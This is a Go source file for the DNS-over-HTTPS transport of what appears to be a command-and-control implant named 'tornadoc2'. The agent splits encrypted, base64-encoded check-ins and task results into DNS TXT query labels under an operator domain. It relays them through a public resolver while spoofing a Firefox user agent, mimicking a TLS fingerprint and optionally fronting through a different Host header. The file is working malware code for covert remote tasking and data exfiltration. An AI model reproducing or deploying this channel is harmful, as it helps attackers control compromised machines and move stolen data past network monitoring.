package transport

import (
    crand "crypto/rand"
    "crypto/tls"
    "encoding/base64"
    "encoding/binary"
    "encoding/hex"
    "encoding/json"
    "errors"
    "fmt"
    "io"
    "bytes"
    "net/http"
    "strings"
    "time"

    "github.com/miekg/dns"

    "tornadoc2/agent/crypto"
    "tornadoc2/agent/internal/tlsfp"
    "tornadoc2/agent/protocol"
)

const (
    dohChunkLen = 63
    dohMaxXferChunks = 1000
    dohDefaultResolver = "https://cloudflare-dns.com/dns-query"
    dohDefaultUA = "Mozilla/5.0 (X11; Linux x86_64; rv:129.0) " +
        "Gecko/20100101 Firefox/129.0"
)

type dohTransport struct {
    domain     string
    resolver   string
    hostHeader string
    userAgent  string
    sid        string
    client     *http.Client
    verbB    string
    verbT    string
    verbR    string
    chunkLen int
}

func NewDoHTransport(domain, resolver, hostHeader,
    userAgent string, tlsCfg *tls.Config) (*dohTransport, error) {

    domain = strings.ToLower(
        strings.TrimSpace(strings.Trim(domain, ".")))
    if domain == "" {
        return nil, errors.New("doh transport: domain is required")
    }

    resolver = strings.TrimSpace(resolver)
    if resolver == "" {
        resolver = dohDefaultResolver
    }
    if !strings.HasPrefix(resolver, "https://") {
        return nil, fmt.Errorf(
            "doh transport: resolver must be an https:// URL, "+
                "got %q", resolver)
    }

    if userAgent == "" {
        userAgent = dohDefaultUA
    }

    client, err := tlsfp.NewDoHClient(
        protocol.WireTLSProfile, tlsCfg)
    if err != nil {
        return nil, fmt.Errorf(
            "doh transport: tls profile: %w", err)
    }

    verbB := protocol.DNSVerbB
    if verbB == "" {
        verbB = "b"
    }
    verbT := protocol.DNSVerbT
    if verbT == "" {
        verbT = "t"
    }
    verbR := protocol.DNSVerbR
    if verbR == "" {
        verbR = "r"
    }
    chunkLen := protocol.DNSPayloadChunkSize
    if chunkLen <= 0 || chunkLen > 63 {
        chunkLen = 63
    }
    if verbB == verbT || verbB == verbR || verbT == verbR {
        verbB, verbT, verbR = "b", "t", "r"
    }

    return &dohTransport{
        domain:     domain,
        resolver:   resolver,
        hostHeader: strings.TrimSpace(hostHeader),
        userAgent:  userAgent,
        verbB:      verbB,
        verbT:      verbT,
        verbR:      verbR,
        chunkLen:   chunkLen,
        client:     client,
    }, nil
}

func (t *dohTransport) Name() string { return "doh" }

func (t *dohTransport) splitChunks(s string) []string {
    if s == "" {
        return nil
    }
    n := t.chunkLen
    out := make([]string, 0, (len(s)+n-1)/n)
    for len(s) > n {
        out = append(out, s[:n])
        s = s[n:]
    }
    if len(s) > 0 {
        out = append(out, s)
    }
    return out
}

func (t *dohTransport) randomXferID() string {
    var b [8]byte
    if _, err := crand.Read(b[:]); err != nil {
        binary.BigEndian.PutUint64(b[:],
            uint64(time.Now().UnixNano()))
    }
    return hex.EncodeToString(b[:])
}

func (t *dohTransport) makeChunkQname(verb, sid, xfer string,
    seq, total int, chunk string) string {

    lengthLabel := fmt.Sprintf("%02x", len(chunk))
    chunkLabel := chunk
    if chunkLabel == "" {
        chunkLabel = "0"
    }
    parts := []string{
        verb,
        sid,
        xfer,
        fmt.Sprintf("%04x", seq),
        fmt.Sprintf("%04x", total),
        lengthLabel,
        chunkLabel,
    }
    parts = append(parts, strings.Split(t.domain, ".")...)
    return strings.Join(parts, ".")
}

func (t *dohTransport) exchange(qname string) ([]byte, error) {
    m := new(dns.Msg)
    m.SetQuestion(dns.Fqdn(qname), dns.TypeTXT)
    m.RecursionDesired = true
    packed, err := m.Pack()
    if err != nil {
        return nil, fmt.Errorf("doh: pack query: %w", err)
    }

    req, err := http.NewRequest("POST", t.resolver,
        bytes.NewReader(packed))
    if err != nil {
        return nil, fmt.Errorf("doh: build request: %w", err)
    }

    req.Header.Set("Content-Type", "application/dns-message")
    req.Header.Set("Accept", "application/dns-message")
    req.Header.Set("User-Agent", t.userAgent)
    req.Header.Set("Accept-Language", "en-US,en;q=0.5")
    req.Header.Set("Cache-Control", "no-cache")

    if t.hostHeader != "" {
        req.Host = t.hostHeader
    }

    resp, err := t.client.Do(req)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()
    if resp.StatusCode != 200 {
        return nil, fmt.Errorf("doh: status %d", resp.StatusCode)
    }

    body, err := io.ReadAll(resp.Body)
    if err != nil {
        return nil, fmt.Errorf("doh: read body: %w", err)
    }

    var r dns.Msg
    if err := r.Unpack(body); err != nil {
        return nil, fmt.Errorf("doh: unpack response: %w", err)
    }
    if r.Rcode != dns.RcodeSuccess {
        return nil, fmt.Errorf("doh: rcode %d", r.Rcode)
    }

    var b64 strings.Builder
    for _, rr := range r.Answer {
        if txt, ok := rr.(*dns.TXT); ok {
            for _, s := range txt.Txt {
                b64.WriteString(s)
            }
        }
    }
    if b64.Len() == 0 {
        return []byte{}, nil
    }
    return base64.RawURLEncoding.DecodeString(b64.String())
}

func (t *dohTransport) sendChunked(verb, sid,
    b64Payload string) ([]byte, error) {

    chunks := t.splitChunks(b64Payload)
    if len(chunks) == 0 {
        chunks = []string{""}
    }
    total := len(chunks)
    if total > dohMaxXferChunks {
        return nil, fmt.Errorf(
            "doh: payload needs %d chunks, limit is %d",
            total, dohMaxXferChunks)
    }
    xfer := t.randomXferID()

    const attempts = 3
    var lastResp []byte
    for i, c := range chunks {
        qname := t.makeChunkQname(verb, sid, xfer, i, total, c)
        var (
            resp []byte
            err  error
        )
        for attempt := 0; attempt < attempts; attempt++ {
            resp, err = t.exchange(qname)
            if err == nil {
                break
            }
            time.Sleep(time.Duration(100*(attempt+1)) *
                time.Millisecond)
        }
        if err != nil {
            return nil, fmt.Errorf(
                "doh: chunk %d/%d xfer=%s: %w",
                i+1, total, xfer, err)
        }
        lastResp = resp
    }
    return lastResp, nil
}

func (t *dohTransport) CheckIn(identity Identity,
    pubkeyPEM, identitySig string, identityTs int64,
    wire *crypto.WireSession) (*CheckinResponse, error) {

    payload := CheckinRequest{Identity: identity}
    if pubkeyPEM != "" {
        payload.AgentPubKey = pubkeyPEM
    }
    if identitySig != "" {
        payload.IdentitySig = identitySig
        payload.IdentityTs = identityTs
    }
    body, err := json.Marshal(payload)
    if err != nil {
        return nil, err
    }
    if wire != nil {
        body, err = wire.EncryptRequest(body)
        if err != nil {
            return nil, err
        }
    }
    raw, err := t.sendChunked(t.verbB, "new",
        base64.RawURLEncoding.EncodeToString(body))
    if err != nil {
        return nil, err
    }
    if wire != nil {
        plain, wasEnc, derr := wire.DecryptResponse(raw)
        if derr != nil {
            return nil, fmt.Errorf("decrypt: %w", derr)
        }
        if wasEnc {
            raw = plain
        }
    }
    var out CheckinResponse
    if err := json.Unmarshal(raw, &out); err != nil {
        return nil, err
    }
    var envelope struct {
        DNSID string `json:"_dns_sid"`
    }
    _ = json.Unmarshal(raw, &envelope)
    if envelope.DNSID == "" {
        return nil, errors.New(
            "checkin reply missing _dns_sid")
    }
    t.sid = envelope.DNSID
    return &out, nil
}

func (t *dohTransport) FetchTasks(
    wire *crypto.WireSession) ([]protocol.Task, error) {

    if t.sid == "" {
        return nil, errors.New("tasks: no session")
    }
    epkChunk := ""
    if wire != nil {
        epk, err := wire.RotateEphemeral()
        if err != nil {
            return nil, fmt.Errorf("doh: rotate epk: %w", err)
        }
        epkChunk = base64.RawURLEncoding.EncodeToString([]byte(epk))
    }
    raw, err := t.sendChunked(t.verbT, t.sid, epkChunk)
    if err != nil {
        return nil, err
    }
    if len(raw) == 0 {
        return nil, nil
    }
    if wire != nil {
        plain, wasEnc, derr := wire.DecryptResponse(raw)
        if derr != nil {
            return nil, fmt.Errorf("decrypt: %w", derr)
        }
        if wasEnc {
            raw = plain
        }
    }
    var tasks []protocol.Task
    if err := json.Unmarshal(raw, &tasks); err != nil {
        return nil, err
    }
    return tasks, nil
}

func (t *dohTransport) PostResult(r protocol.Result,
    wire *crypto.WireSession) error {

    if t.sid == "" {
        return errors.New("results: no session")
    }
    body, err := json.Marshal(r)
    if err != nil {
        return err
    }
    if wire != nil {
        body, err = wire.EncryptRequest(body)
        if err != nil {
            return err
        }
    }
    _, err = t.sendChunked(t.verbR, t.sid,
        base64.RawURLEncoding.EncodeToString(body))
    return err
}

func (t *dohTransport) Close() error {
    t.client.CloseIdleConnections()
    return nil
}